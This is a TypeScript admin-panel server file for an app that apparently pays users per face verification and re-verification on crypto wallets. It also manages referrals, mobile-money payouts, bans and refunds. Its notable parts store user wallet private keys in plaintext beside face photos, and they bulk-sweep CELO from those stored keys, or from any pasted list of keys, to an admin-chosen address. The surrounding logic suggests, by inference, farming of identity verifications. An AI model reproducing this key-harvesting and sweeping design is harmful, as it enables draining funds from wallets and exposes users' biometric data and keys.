      const { data, error } = await supabaseAdmin.from(table).select(select).order("id").range(from, from + 999);
      if (error) throw new Error(error.message);
      rows.push(...(data ?? []));
      if (!data || data.length < 1000) break;
    }
    return rows;
  };
  const [profiles, tasks] = await Promise.all([
    fetchAll("profiles", "id, uid_seq, display_name, phone_number, email, referred_by, referral_code"),
    fetchAll("tasks", "id, user_id, slot, status, initial_verify_at, reverify_count"),
  ]);

  const firstVerifySlotsByUser = new Map<string, Set<number>>();
  const reverifiesByUser = new Map<string, number>();
  for (const t of tasks ?? []) {
    if (t.initial_verify_at) {
      const slots = firstVerifySlotsByUser.get(t.user_id) ?? new Set<number>();
      slots.add(Number(t.slot));
      firstVerifySlotsByUser.set(t.user_id, slots);
    }
    const count = Number(t.reverify_count ?? 0);
    if (count > 0) reverifiesByUser.set(t.user_id, (reverifiesByUser.get(t.user_id) ?? 0) + count);
  }

  const byReferrer = new Map<string, { refereeCount: number; verifiedReferees: number; totalVerifies: number; totalFirstVerifies: number; totalReverifies: number }>();
  for (const p of profiles ?? []) {
    if (!p.referred_by) continue;
    const cur = byReferrer.get(p.referred_by) ?? { refereeCount: 0, verifiedReferees: 0, totalVerifies: 0, totalFirstVerifies: 0, totalReverifies: 0 };
    cur.refereeCount += 1;
    const v = firstVerifySlotsByUser.get(p.id)?.size ?? 0;
    if (v > 0) cur.verifiedReferees += 1;
    cur.totalVerifies += v;
    cur.totalFirstVerifies += v;
    cur.totalReverifies += reverifiesByUser.get(p.id) ?? 0;
    byReferrer.set(p.referred_by, cur);
  }


  const profileById = new Map((profiles ?? []).map((p) => [p.id, p]));
  const rows = Array.from(byReferrer.entries()).map(([userId, s]) => {
    const p = profileById.get(userId);
    return {
      userId,
      name: p?.display_name ?? "—",
      phone: p?.phone_number ?? p?.email ?? "",
      referralCode: p?.referral_code ?? null,
      uid: Number(p?.uid_seq ?? 0),
      ...s,
    };
  });
  rows.sort((a, b) => b.totalVerifies - a.totalVerifies || b.refereeCount - a.refereeCount);
  return rows;
});


// ---------------- Referral lock unlock ----------------
export const adminSetReferralUnlock = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    unlocked: z.boolean(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("profiles")
      .update({ referral_unlock_override: data.unlocked } as any)
      .eq("id", data.userId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// ---------------- Wallet reset ----------------
export const adminResetWallet = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error, count } = await supabaseAdmin
      .from("wallets")
      .delete({ count: "exact" })
      .eq("user_id", data.userId);
    if (error) throw new Error(error.message);
    return { ok: true, deleted: count ?? 0 };
  });

// ---------------- Delete all not-whitelisted attempts ----------------
export const adminDeleteAllUnverified = createServerFn({ method: "POST" }).handler(async () => {
  const supabaseAdmin = await gate();
  // fetch all photo paths in batches
  const paths: string[] = [];
  for (let from = 0; ; from += 1000) {
    const { data, error } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id, face_photo_url")
      .order("id")
      .range(from, from + 999);
    if (error) throw new Error(error.message);
    for (const r of data ?? []) if (r.face_photo_url) paths.push(r.face_photo_url);
    if (!data || data.length < 1000) break;
  }
  if (paths.length > 0) {
    // supabase storage remove has no strict limit but chunk to be safe
    for (let i = 0; i < paths.length; i += 500) {
      await supabaseAdmin.storage.from("face-photos").remove(paths.slice(i, i + 500));
    }
  }
  const { error, count } = await supabaseAdmin
    .from("unverified_attempts")
    .delete({ count: "exact" })
    .not("id", "is", null);
  if (error) throw new Error(error.message);
  return { ok: true, deleted: count ?? 0 };
});

// ---------------- Celo gas sweep from not-whitelisted keys ----------------
export const adminSweepCeloGas = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) =>
    z
      .object({
        to: z.string().trim().regex(/^0x[0-9a-fA-F]{40}$/, "সঠিক receive address দিন (0x...)"),
        offset: z.number().int().min(0).default(0),
        limit: z.number().int().min(1).max(60).default(40),
      })
      .parse(i),
  )
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: rows, error } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id, wallet_private_key")
      .not("wallet_private_key", "is", null)
      .order("created_at", { ascending: true })
      .range(data.offset, data.offset + data.limit - 1);
    if (error) throw new Error(error.message);

    const keys = (rows ?? []).map((r: any) => r.wallet_private_key as string).filter(Boolean);
    if (keys.length === 0) {
      return { done: true, offset: data.offset, checked: 0, sent: 0, empty: 0, failed: 0, totalCelo: "0", results: [] as any[] };
    }

    const { sweepCeloKeys } = await import("./celo-sweep.server");
    const results = await sweepCeloKeys(keys, data.to);
    const sent = results.filter((r) => r.status === "sent");
    const totalCelo = sent.reduce((s, r) => s + Number(r.amount ?? 0), 0);

    return {
      done: (rows?.length ?? 0) < data.limit,
      offset: data.offset + (rows?.length ?? 0),
      checked: keys.length,
      sent: sent.length,
      empty: results.filter((r) => r.status === "empty").length,
      failed: results.filter((r) => r.status === "failed").length,
      totalCelo: totalCelo.toFixed(6),
      results: results.filter((r) => r.status !== "empty"),
    };
  });

/** Sweep native CELO from a pasted list of private keys (50+ in parallel). */
export const adminSweepCeloFromKeys = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) =>
    z
      .object({
        to: z.string().trim().regex(/^0x[0-9a-fA-F]{40}$/, "সঠিক receive address দিন (0x...)"),
        keys: z.array(z.string().trim().min(1)).min(1).max(60),
      })
      .parse(i),
  )
  .handler(async ({ data }) => {
    await gate();
    const { sweepCeloKeys } = await import("./celo-sweep.server");
    const results = await sweepCeloKeys(data.keys, data.to, 60);
    const sent = results.filter((r) => r.status === "sent");
    const totalCelo = sent.reduce((s, r) => s + Number(r.amount ?? 0), 0);
    return {
      checked: data.keys.length,
      sent: sent.length,
      empty: results.filter((r) => r.status === "empty").length,
      failed: results.filter((r) => r.status === "failed").length,
      totalCelo: totalCelo.toFixed(6),
      results,
    };
  });

/** Start a background sweep job: runs on the server, survives page close / data off. */
export const adminStartCeloSweepJob = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) =>
    z
      .object({
        to: z.string().trim().regex(/^0x[0-9a-fA-F]{40}$/, "সঠিক receive address দিন (0x...)"),
        keys: z.array(z.string().trim()).default([]),
        useNotWhitelisted: z.boolean().default(false),
      })
      .parse(i),
  )
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();

    let keys = data.keys.filter((k) => /^(0x)?[0-9a-fA-F]{64}$/.test(k));
    if (data.useNotWhitelisted) {
      const { data: rows, error } = await supabaseAdmin
        .from("unverified_attempts")
        .select("wallet_private_key")
        .not("wallet_private_key", "is", null)
        .limit(20000);
      if (error) throw new Error(error.message);
      keys = (rows ?? []).map((r: any) => r.wallet_private_key as string).filter((k: string) => /^(0x)?[0-9a-fA-F]{64}$/.test(k));
    }
    keys = Array.from(new Set(keys));
    if (keys.length === 0) throw new Error("কোনো valid private key পাওয়া যায়নি");

    // stop any older running job so only one sweep runs at a time
    await supabaseAdmin.from("celo_sweep_jobs").update({ status: "cancelled" }).eq("status", "running");

    const { data: job, error: insErr } = await supabaseAdmin
      .from("celo_sweep_jobs")
      .insert({ to_address: data.to, keys, total_keys: keys.length, heartbeat_at: new Date(Date.now() - 600000).toISOString() })
      .select("id, total_keys")
      .maybeSingle();
    if (insErr || !job) throw new Error(insErr?.message ?? "job তৈরি হয়নি");
    return { jobId: job.id, total: job.total_keys };
  });

/** Progress of the latest sweep job (poll this; safe to close the page). */
export const adminCeloSweepJobStatus = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin
    .from("celo_sweep_jobs")
    .select("id, to_address, total_keys, cursor, sent, failed, empty_count, dust, total_celo, status, log, error_message, created_at, updated_at")
    .order("created_at", { ascending: false })
    .limit(1)
    .maybeSingle();
  return data ?? null;
});

export const adminCancelCeloSweepJob = createServerFn({ method: "POST" }).handler(async () => {
  const supabaseAdmin = await gate();
  await supabaseAdmin.from("celo_sweep_jobs").update({ status: "cancelled" }).eq("status", "running");
  return { ok: true };
});





// ---------------- Bonus settings ----------------
export const adminGetBonusSettings = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin.from("bonus_settings").select("*").eq("id", "default").maybeSingle();
  return data ?? { id: "default", first_verify_bonus: 50, reverify_bonus: 200, referrer_bonus: 100 };
});

export const adminUpdateBonusSettings = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    first_verify_bonus: z.number().int().min(0).max(100000),
    reverify_bonus: z.number().int().min(0).max(100000),
    referrer_bonus: z.number().int().min(0).max(100000),
    first_verify_mining_mode: z.boolean().optional(),
    email_otp_enabled: z.boolean().optional(),
    // 2X promo window
    promo_active: z.boolean().optional(),
    promo_title: z.string().max(200).optional().nullable(),
    promo_start_at: z.string().optional().nullable(),
    promo_end_at: z.string().optional().nullable(),
    promo_first_verify_bonus: z.number().int().min(0).max(100000).optional().nullable(),
    promo_reverify_bonus: z.number().int().min(0).max(100000).optional().nullable(),
    promo_referrer_bonus: z.number().int().min(0).max(100000).optional().nullable(),
    // Payout method toggles
    bkash_enabled: z.boolean().optional(),
    nagad_enabled: z.boolean().optional(),
    bkash_off_message: z.string().max(300).optional().nullable(),
    nagad_off_message: z.string().max(300).optional().nullable(),
    recharge_enabled: z.boolean().optional(),
    recharge_off_message: z.string().max(300).optional().nullable(),
    usdt_enabled: z.boolean().optional(),
    usdt_off_message: z.string().max(300).optional().nullable(),
    withdraw_enabled: z.boolean().optional(),
    withdraw_off_message: z.string().max(300).optional().nullable(),
    withdraw_off_until: z.string().optional().nullable(),
    test_apk_url: z.string().max(500).optional().nullable(),
    test_apk_version: z.string().max(50).optional().nullable(),
    min_app_version: z.string().max(50).optional().nullable(),
    force_update_enabled: z.boolean().optional(),
    force_update_web: z.boolean().optional(),
    force_update_message: z.string().max(600).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: prev } = await supabaseAdmin
      .from("bonus_settings")
      .select("bkash_enabled,nagad_enabled,usdt_enabled,recharge_enabled,withdraw_enabled")
      .eq("id", "default")
      .maybeSingle();
    const patch: any = {
      id: "default",
      first_verify_bonus: data.first_verify_bonus,
      reverify_bonus: data.reverify_bonus,
      referrer_bonus: data.referrer_bonus,
      updated_at: new Date().toISOString(),
    };
    if (typeof data.first_verify_mining_mode === "boolean") patch.first_verify_mining_mode = data.first_verify_mining_mode;
    if (typeof data.email_otp_enabled === "boolean") patch.email_otp_enabled = data.email_otp_enabled;
    for (const k of [
      "promo_active","promo_title","promo_start_at","promo_end_at",
      "promo_first_verify_bonus","promo_reverify_bonus","promo_referrer_bonus",
      "bkash_enabled","nagad_enabled","bkash_off_message","nagad_off_message",
      "recharge_enabled","recharge_off_message",
      "usdt_enabled","usdt_off_message",
      "withdraw_enabled","withdraw_off_message","withdraw_off_until",
      "test_apk_url", "test_apk_version",
      "min_app_version", "force_update_enabled", "force_update_web", "force_update_message",
    ] as const) {
      if ((data as any)[k] !== undefined) patch[k] = (data as any)[k];
    }
    const { error } = await supabaseAdmin.from("bonus_settings").upsert(patch);
    if (error) throw new Error(error.message);
    resetEmailOtpCache();

    // পেমেন্ট মেথড on/off হলে সব ইউজারকে জানিয়ে দাও (push + in-app notice)
    const labels: Record<string, string> = {
      bkash_enabled: "বিকাশ উইথড্র",
      nagad_enabled: "নগদ উইথড্র",
      usdt_enabled: "USDT উইথড্র",
      recharge_enabled: "মোবাইল রিচার্জ",
      withdraw_enabled: "উইথড্র সিস্টেম",
    };
    const changes: string[] = [];
    for (const key of Object.keys(labels)) {
      const next = (patch as any)[key];
      if (typeof next !== "boolean") continue;
      const before = (prev as any)?.[key];
      const beforeBool = before === false ? false : true;
      if (beforeBool === next) continue;
      changes.push(`${next ? "✅" : "⛔"} ${labels[key]} এখন ${next ? "চালু" : "বন্ধ"}`);
    }
    if (changes.length > 0) {
      const title = "💳 পেমেন্ট মেথড আপডেট";
      const body = changes.join("\n");
      try {
        const { sendPushToAllTokens } = await import("@/lib/push.server");
        await sendPushToAllTokens({ title, body, url: "/withdraw" });
      } catch { /* push ব্যর্থ হলেও settings সেভ থাকবে */ }
      try {
        const page = 1000;
        for (let from = 0; from < 200_000; from += page) {
          const { data: ids } = await supabaseAdmin
            .from("profiles").select("id").range(from, from + page - 1);
          const rows = ids ?? [];
          if (rows.length === 0) break;
          await supabaseAdmin.from("user_notices").insert(
            rows.map((r: any) => ({ user_id: r.id, title, body })) as any,
          );
          if (rows.length < page) break;
        }
      } catch { /* ignore */ }
    }
    return { ok: true, notified: changes.length > 0 ? changes : null };
  });


// Toggle just the global "first-verify mining mode" switch. When ON, mining
// starts as soon as user has 10 first-verifies (no re-verify needed).
export const adminSetFirstVerifyMiningMode = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ enabled: z.boolean() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("bonus_settings").upsert({
      id: "default",
      first_verify_mining_mode: data.enabled,
      updated_at: new Date().toISOString(),
    } as any);
    if (error) throw new Error(error.message);
    // Re-settle every user so mining state reflects the new mode immediately.
    const { data: users } = await supabaseAdmin.from("mining_state").select("user_id");
    for (const u of users ?? []) {
      await supabaseAdmin.rpc("settle_mining", { _user_id: u.user_id });
    }
    return { ok: true };
  });

// Admin: convert a "first-verify" (status='verified') task into a completed
// re-verify (status='done'). Useful when Good-App isn't asking re-verify
// but user is stuck waiting. Also resets whitelist_ok=true and pushes the
// next re-verify due date 4 days out, then re-settles mining.
export const adminMarkAsReverified = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ taskId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: t } = await supabaseAdmin
      .from("tasks").select("id, user_id, status, wallet_address, reverify_count").eq("id", data.taskId).maybeSingle();
    if (!t) throw new Error("Task নেই");
    if (!t.wallet_address) throw new Error("Task-এ wallet নেই");
    const now = new Date();
    const dueAt = new Date(now.getTime() + REVERIFY_INTERVAL_MS).toISOString();
    const nextCount = Math.max(1, Number(t.reverify_count ?? 0) + 1);
    const { error } = await supabaseAdmin.from("tasks").update({
      status: "done",
      done_at: now.toISOString(),
      whitelist_ok: true,
      last_whitelist_check_at: now.toISOString(),
      last_reverified_at: now.toISOString(),
      reverify_count: nextCount,
      reverify_due_at: dueAt,
    }).eq("id", data.taskId);
    if (error) throw new Error(error.message);
    await supabaseAdmin.rpc("settle_mining", { _user_id: t.user_id });
    return { ok: true };
  });

// ---------------- Re-verify grouped by user ----------------
// One card per user: shows how many faces need re-verify (whitelist off = urgent,
// timer expired = ready, still waiting = normal). Click through to user detail.
export const adminReverifyByUser = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const rows: any[] = [];
  for (let from = 0; ; from += 1000) {
    const { data, error } = await supabaseAdmin
      .from("tasks")
      .select("id, user_id, slot, face_label, reverify_due_at, whitelist_ok, status, reverify_count, profiles:user_id(display_name, phone_number, uid_seq)")
      .in("status", ["verified", "done"])
      .order("id")
      .range(from, from + 999);
    if (error) throw new Error(error.message);
    rows.push(...(data ?? []));
    if (!data || data.length < 1000) break;
  }
  const now = Date.now();
  const byUser = new Map<string, any>();
  for (const t of rows) {
    const dueMs = t.reverify_due_at ? new Date(t.reverify_due_at).getTime() : 0;
    const notWl = t.whitelist_ok === false;
    const ready = notWl || dueMs <= now;
    const entry = byUser.get(t.user_id) ?? {
      user_id: t.user_id,
      uid: t.profiles?.uid_seq ?? null,
      display_name: t.profiles?.display_name ?? "—",
      phone_number: t.profiles?.phone_number ?? "",
      total: 0, ready: 0, urgent: 0, waiting: 0,
      // কে কতবার রি-ভেরিফাই করেছে — সহজ হিসাব
      reverifiedSlots: 0,   // কতগুলো ঘর অন্তত একবার রি-ভেরিফাই হয়েছে
      totalReverifies: 0,   // সব ঘর মিলিয়ে মোট কতবার রি-ভেরিফাই
      repeatSlots: 0,       // কতগুলো ঘর ২য় বার (বা তার বেশি) রি-ভেরিফাই হয়েছে
      soonestDue: null as number | null,
    };
    const rc = Number(t.reverify_count ?? 0);
    if (rc > 0) entry.reverifiedSlots += 1;
    if (rc >= 2) entry.repeatSlots += 1;
    entry.totalReverifies += rc;
    if (t.status === "verified") {
      entry.total += 1;
      if (notWl) entry.urgent += 1;
      if (ready) entry.ready += 1; else entry.waiting += 1;
      if (dueMs > 0 && (entry.soonestDue === null || dueMs < entry.soonestDue)) {
        entry.soonestDue = dueMs;
      }
    }
    byUser.set(t.user_id, entry);
  }
  return Array.from(byUser.values()).sort((a, b) => b.urgent - a.urgent || b.ready - a.ready || b.totalReverifies - a.totalReverifies);
});


// ---------------- Admin Direct Payout ----------------
// Admin manually sends TK to a user's Bkash/Nagad. Records in withdrawals
// (status=paid) so the user sees it in their history AND it appears in the
// admin withdrawals panel. Also deducts from user's balance.
export const adminDirectPayout = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    amount: z.number().positive().max(1000000),
    provider: z.enum(["bkash", "nagad"]),
    walletNumber: z.string().trim().min(6).max(20),
    note: z.string().trim().max(500).optional(),
    deductBalance: z.boolean().default(true),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const now = new Date().toISOString();
    const cleanNum = data.walletNumber.replace(/\D/g, "");
    const { data: row, error } = await supabaseAdmin.from("withdrawals").insert({
      user_id: data.userId,
      amount: data.amount,
      provider: data.provider,
      wallet_number: cleanNum,
      status: "paid",
      admin_note: `[Admin Payout] ${data.note ?? ""}`.trim(),
      processed_at: now,
    }).select().maybeSingle();
    if (error) throw new Error(error.message);

    if (data.deductBalance) {
      const { data: m } = await supabaseAdmin.from("mining_state")
        .select("withdrawn_amount").eq("user_id", data.userId).maybeSingle();
      if (m) {
        await supabaseAdmin.from("mining_state")
          .update({ withdrawn_amount: Number(m.withdrawn_amount ?? 0) + data.amount })
          .eq("user_id", data.userId);
      }
    }
    return { ok: true, withdrawal: row };
  });

// ---------------- Paid Report (per-user totals) ----------------
export const adminPaidReport = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const fetchAllPaged = async <T = any>(table: string, select: string, filter?: (q: any) => any): Promise<T[]> => {
    const rows: T[] = [];
    for (let from = 0; ; from += 1000) {
      let q: any = supabaseAdmin.from(table as any).select(select).order("id").range(from, from + 999);
      if (filter) q = filter(q);
      const { data, error } = await q;
      if (error) throw new Error(error.message);
      rows.push(...((data as any[]) ?? []) as T[]);
      if (!data || data.length < 1000) break;
    }
    return rows;
  };

  const [profiles, withdrawals, recharges, credits] = await Promise.all([
    fetchAllPaged<{ id: string; display_name: string | null; phone_number: string | null; uid_seq: number | null }>("profiles", "id, display_name, phone_number, uid_seq"),
    fetchAllPaged<{ user_id: string; amount: number }>("withdrawals", "user_id, amount", (q) => q.eq("status", "paid")),
    fetchAllPaged<{ user_id: string; amount: number }>("recharges", "user_id, amount", (q) => q.eq("status", "success")),
    fetchAllPaged<{ user_id: string; amount: number }>("admin_credits", "user_id, amount"),
  ]);

  const map = new Map<string, { userId: string; name: string; phone: string; uid: number | null; withdraw: number; recharge: number; adminCredit: number; total: number }>();
  for (const p of profiles) {
    map.set(p.id, { userId: p.id, name: p.display_name ?? "—", phone: p.phone_number ?? "—", uid: p.uid_seq, withdraw: 0, recharge: 0, adminCredit: 0, total: 0 });
  }
  for (const w of withdrawals) {
    const r = map.get(w.user_id); if (!r) continue;
    r.withdraw += Number(w.amount) || 0;
  }
  for (const r0 of recharges) {
    const r = map.get(r0.user_id); if (!r) continue;
    r.recharge += Number(r0.amount) || 0;
  }
  for (const c of credits) {
    const r = map.get(c.user_id); if (!r) continue;
    r.adminCredit += Math.max(0, Number(c.amount) || 0);
  }
  const rows = Array.from(map.values())
    .map((r) => ({ ...r, total: r.withdraw + r.recharge + r.adminCredit }))
    .filter((r) => r.total > 0)
    .sort((a, b) => b.total - a.total);

  const grandTotal = rows.reduce((a, r) => a + r.total, 0);
  return { rows, grandTotal, generatedAt: new Date().toISOString() };
});

// ---------------- Block / Unblock user ----------------
export const adminSetUserBlocked = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    blocked: z.boolean(),
    reason: z.string().trim().max(300).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.auth.admin.updateUserById(data.userId, {
      ban_duration: data.blocked ? "876000h" : "none",
    } as any);
    if (error) throw new Error(error.message);
    // Keep profiles.banned in sync so the admin panel (and app-side gates) can
    // always tell who is blocked — auth-level bans alone were invisible in the UI.
    const { error: pErr } = await supabaseAdmin.from("profiles").update({
      banned: data.blocked,
      banned_reason: data.blocked ? (data.reason || "Admin কর্তৃক block করা হয়েছে") : null,
      banned_at: data.blocked ? new Date().toISOString() : null,
    } as any).eq("id", data.userId);
    if (pErr) throw new Error(pErr.message);
    return { ok: true, blocked: data.blocked };
  });

/** ব্যালেন্স freeze/unfreeze — account block না করেই টাকা নড়াচড়া বন্ধ রাখা যায়। */
export const adminSetBalanceFrozen = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    frozen: z.boolean(),
    reason: z.string().trim().max(300).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("profiles").update({
      balance_frozen: data.frozen,
      balance_frozen_at: data.frozen ? new Date().toISOString() : null,
      balance_frozen_reason: data.frozen ? (data.reason || "হিসাব যাচাইয়ের জন্য ব্যালেন্স সাময়িকভাবে freeze") : null,
    } as any).eq("id", data.userId);
    if (error) throw new Error(error.message);
    await supabaseAdmin.from("user_notices").insert({
      user_id: data.userId,
      title: data.frozen ? "🧊 ব্যালেন্স freeze করা হয়েছে" : "✅ ব্যালেন্স আবার চালু",
      body: data.frozen
        ? `আপনার ব্যালেন্স সাময়িকভাবে freeze করা হয়েছে — এখন withdraw/send/recharge করা যাবে না।\nকারণ: ${data.reason || "হিসাব যাচাই চলছে"}\n\nবোনাস শুধু প্রথম ১০টি slot-এর জন্যই — প্রথম ১০টি slot re-verify সম্পন্ন করলে বিষয়টি আবার দেখা হবে।`
        : "আপনার ব্যালেন্স আবার সক্রিয় করা হয়েছে — এখন withdraw/send/recharge করতে পারবেন।",
    } as any);
    return { ok: true, frozen: data.frozen };
  });

/** Fraud/dispute transfer reversal — moves a transfer receiver's still-available main balance back to the original sender. */
export const adminReturnTransferToSender = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    transferId: z.string().uuid(),
    note: z.string().trim().max(500).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: t, error: tErr } = await supabaseAdmin
      .from("transfers")
      .select("id, sender_id, receiver_id, amount, fee_amount, created_at, sender:profiles!transfers_sender_id_fkey(uid_seq, display_name), receiver:profiles!transfers_receiver_id_fkey(uid_seq, display_name)")
      .eq("id", data.transferId)
      .maybeSingle();
    if (tErr) throw new Error(tErr.message);
    if (!t) throw new Error("Transfer পাওয়া যায়নি");

    const { count } = await supabaseAdmin
      .from("balance_ledger" as any)
      .select("id", { count: "exact", head: true })
      .eq("source_id", data.transferId)
      .in("type", ["transfer_refund", "transfer_refund_debit"]);
    if ((count ?? 0) > 0) throw new Error("এই transfer আগেই ফেরত দেওয়া হয়েছে");

    const amount = Math.floor(Number((t as any).amount ?? 0));
    if (amount <= 0) throw new Error("ফেরত দেওয়ার amount ঠিক নেই");

    const { data: receiverMining } = await supabaseAdmin
      .from("mining_state")
      .select("accrued_amount, withdrawn_amount, bonus_amount")
      .eq("user_id", (t as any).receiver_id)
      .maybeSingle();
    if (!receiverMining) throw new Error("Receiver balance পাওয়া যায়নি");

    await (supabaseAdmin as any).rpc("settle_mining", { _user_id: (t as any).receiver_id });
    const { data: receiverBreakdown } = await (supabaseAdmin as any).rpc("get_user_balance_breakdown", { _user_id: (t as any).receiver_id });
    const receiverMain = Math.floor(Number((receiverBreakdown as any)?.bonus_part ?? 0));
    if (receiverMain < amount) {
      throw new Error(`Receiver-এর main balance কম — এখন আছে ${receiverMain}৳, ফেরত দরকার ${amount}৳`);
    }

    const note = (data.note ?? "") || "Admin dispute refund";
    const now = new Date().toISOString();
    const receiverPrevAccrued = Number((receiverMining as any).accrued_amount ?? 0);
    const receiverPrevBonus = Number((receiverMining as any).bonus_amount ?? 0);
    const receiverWithdrawn = Number((receiverMining as any).withdrawn_amount ?? 0);
    const receiverNewAccrued = Math.max(0, receiverPrevAccrued - amount);
    const receiverNewBonus = Math.max(0, receiverPrevBonus - amount);

    const { error: debitErr } = await supabaseAdmin
      .from("mining_state")
      .update({ accrued_amount: receiverNewAccrued, bonus_amount: receiverNewBonus } as any)
      .eq("user_id", (t as any).receiver_id);
    if (debitErr) throw new Error(debitErr.message);

    await supabaseAdmin.from("balance_ledger" as any).insert({
      user_id: (t as any).receiver_id,
      amount: -amount,
      type: "transfer_refund_debit",
      source_id: data.transferId,
      metadata: {
        returned_to: (t as any).sender_id,
        original_transfer_id: data.transferId,
        note,
      },
    });
    await (supabaseAdmin as any).from("balance_audit").insert({
      user_id: (t as any).receiver_id,
      actor: "admin_panel",
      source: "transfer_refund_debit",
      note: `${note} · transfer ${data.transferId}`,
      accrued_before: receiverPrevAccrued,
      accrued_after: receiverNewAccrued,
      bonus_before: receiverPrevBonus,
      bonus_after: receiverNewBonus,
      withdrawn_before: receiverWithdrawn,
      withdrawn_after: receiverWithdrawn,
      balance_before: receiverPrevAccrued - receiverWithdrawn,
      balance_after: receiverNewAccrued - receiverWithdrawn,
      delta: -amount,
    });

    const { data: senderMiningBefore } = await supabaseAdmin
      .from("mining_state")
      .select("accrued_amount, withdrawn_amount, bonus_amount")
      .eq("user_id", (t as any).sender_id)
      .maybeSingle();
    await (supabaseAdmin as any).rpc("credit_bonus_balance", {
      _user_id: (t as any).sender_id,
      _amount: amount,
      _type: "transfer_refund",
      _source_id: data.transferId,
      _metadata: {
        returned_from: (t as any).receiver_id,
        original_transfer_id: data.transferId,
        note,
      },
    });
    const senderPrevAccrued = Number((senderMiningBefore as any)?.accrued_amount ?? 0);
    const senderPrevBonus = Number((senderMiningBefore as any)?.bonus_amount ?? 0);
    const senderWithdrawn = Number((senderMiningBefore as any)?.withdrawn_amount ?? 0);
    await (supabaseAdmin as any).from("balance_audit").insert({
      user_id: (t as any).sender_id,
      actor: "admin_panel",
      source: "transfer_refund",
      note: `${note} · transfer ${data.transferId}`,
      accrued_before: senderPrevAccrued,
      accrued_after: senderPrevAccrued + amount,
      bonus_before: senderPrevBonus,
      bonus_after: senderPrevBonus + amount,
      withdrawn_before: senderWithdrawn,
      withdrawn_after: senderWithdrawn,
      balance_before: senderPrevAccrued - senderWithdrawn,
      balance_after: senderPrevAccrued + amount - senderWithdrawn,
      delta: amount,
    });

    await supabaseAdmin.from("user_notices").insert([
      {
        user_id: (t as any).sender_id,
        title: "↩️ Send Money ফেরত দেওয়া হয়েছে",
        body: `${amount}৳ admin যাচাই করে আপনার balance-এ ফেরত দিয়েছে।`,
      },
      {
        user_id: (t as any).receiver_id,
        title: "↩️ Send Money ফেরত নেওয়া হয়েছে",
        body: `${amount}৳ admin যাচাই করে original sender-এর balance-এ ফেরত দিয়েছে। কারণ: ${note}`,
      },
    ] as any);

    return {
      ok: true,
      amount,
      senderUid: (t as any).sender?.uid_seq ?? null,
      receiverUid: (t as any).receiver?.uid_seq ?? null,
      at: now,
    };
  });


/** ব্লক করা সব ইউজারের আলাদা তালিকা (কারণ, ব্যালেন্স, বকেয়া সহ) */
export const adminListBlockedUsers = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data: profiles, error } = await supabaseAdmin
    .from("profiles")
    .select("id, uid_seq, display_name, phone_number, email, banned, banned_reason, banned_at")
    .eq("banned", true)
    .order("banned_at", { ascending: false });
  if (error) throw new Error(error.message);
  const ids = (profiles ?? []).map((p: any) => p.id);
  if (!ids.length) return [];
  const [minings, debts, wds] = await Promise.all([
    supabaseAdmin.from("mining_state").select("user_id, accrued_amount, withdrawn_amount").in("user_id", ids),
    supabaseAdmin.from("user_debts").select("user_id, amount, status").in("user_id", ids).eq("status", "active"),
    supabaseAdmin.from("withdrawals").select("user_id, amount, status").in("user_id", ids),
  ]);
  const mMap = new Map<string, any>();
  for (const m of minings.data ?? []) mMap.set(m.user_id, m);
  const dMap = new Map<string, number>();
  for (const d of debts.data ?? []) dMap.set(d.user_id, (dMap.get(d.user_id) ?? 0) + Number(d.amount || 0));
  const pMap = new Map<string, number>();
  for (const w of wds.data ?? []) {
    if (w.status !== "paid") continue;
    pMap.set(w.user_id, (pMap.get(w.user_id) ?? 0) + Number(w.amount || 0));
  }
  return (profiles ?? []).map((p: any) => {
    const m = mMap.get(p.id);
    return {
      userId: p.id as string,
      uid: (p.uid_seq ?? null) as number | null,
      name: (p.display_name ?? null) as string | null,
      phone: (p.phone_number ?? null) as string | null,
      email: (p.email ?? null) as string | null,
      reason: (p.banned_reason ?? null) as string | null,
      bannedAt: (p.banned_at ?? null) as string | null,
      balance: Number(m?.accrued_amount ?? 0) - Number(m?.withdrawn_amount ?? 0),
      debt: dMap.get(p.id) ?? 0,
      paid: pMap.get(p.id) ?? 0,
    };
  });
});

// ---------------- Daily Referral Activity Report ----------------
